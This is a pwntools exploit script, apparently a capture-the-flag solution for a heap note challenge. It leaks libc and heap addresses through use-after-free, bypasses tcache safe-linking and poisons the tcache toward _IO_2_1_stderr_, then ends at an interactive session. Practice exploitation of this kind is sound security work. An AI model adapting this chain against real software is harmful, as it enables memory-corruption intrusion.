#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('prob_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x000055555555566c
        # b*free
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

def add(idx, size, data):
    sla(b'Choice: ', b'1')
    slna(b'Index (0-6): ', idx)
    slna(b'ize (1-4096): ', size)
    sa(b'Content: ', data)

def delete(idx):
    sla(b'Choice: ', b'4')
    slna(b'Index (0-6): ', idx)

def read_note(idx):
    sla(b'Choice: ', b'2')
    slna(b'Index (0-6): ', idx)

def edit(idx, data):
    sla(b'Choice: ', b'3')
    slna(b'Index (0-6): ', idx)
    sa(b'New content: ', data)

add(0, 0x500, b'evilehehe')
add(1, 0x200, b'babyevil')
# add(2, 0x200, b'second evil baby eheheheh')

delete(0)
read_note(0)

ru(b']: ')
libc_leak = u64(r(8))
libc.address = libc_leak- 0x203b20
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')


delete(1)
read_note(1)
ru(b']: ')
heap_base = u64(r(5).ljust(8,b'\0')) << 12
info(f'heap base: {hex(heap_base)}')
edit(1, b'a'*0x10)
delete(1)

tcache_per_thread = heap_base +0x40
off_next_ptr = 0x148
off_num = 0xe

def fake_math(ptr1, ptr2):
    a = (ptr1>>12) ^ ptr2
    return p64(a)
edit(1, fake_math(heap_base+0x7b0, tcache_per_thread))
add(2, 0x200, b'3'*0x10)

load =flat(
    b'a'*off_num,
    p8(0x36),
    b'a'*(off_next_ptr - off_num-1),
    libc.sym._IO_2_1_stderr_-0x10,

)

add(3, 0x200, load.ljust(0x200,b'a'))
# addy(5, 0x200, b'evilhere')


p.interactive()
